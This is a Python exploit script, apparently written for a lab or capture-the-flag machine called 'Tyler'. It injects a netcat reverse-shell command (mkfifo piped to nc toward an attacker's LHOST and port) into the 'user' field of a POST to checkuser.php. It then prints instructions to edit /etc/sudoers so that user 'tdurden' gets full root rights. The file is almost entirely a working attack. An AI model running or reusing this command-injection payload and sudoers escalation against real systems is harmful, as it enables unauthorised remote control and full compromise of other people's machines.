import requests
import os

machineName = input("Enter Machine Name: ")
sess = requests.session()

# -------------------------------------------------- Tyler -------------------------------------------------- #
def Tyler():
    global sess
    ip = input("Enter Machine Ip: ")
    response = os.system(f"ping -c 1 {ip} > /dev/null")
    if response == 0:
        print('[*] Host is up')
    else:
        print('[!] Host is down, Check Your Ip Or Vpn')
        exit()
    LHOST = input("[*] Enter LHOST: ")
    LPORT = input("[*] Enter Listening Port: ")
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"

    postData = {
        "user" : f'1;{payload}',
        "submit" : 'Submit+Query'
    }
    print("[*] Sending Payload")
    try:
        shell = sess.post(f"http://{ip}/betatest/checkuser.php", data=postData)
        if(shell.status_code == 200):
            print("[*] Payload Sent")
            print("[*] vim /etc/sudoers and add 'tdurden ALL=(ALL)	ALL'")
            print("[*] Then do whatever you want")
        else:
            print("[!] Payload Failed")
            exit()
    except:
        print("[!] Connection Failed")

if __name__ == "__main__":
    if machineName == "Tyler" or machineName == "tyler":
        Tyler()
    else:
        print("[!] Machine Not Found")
        exit()
        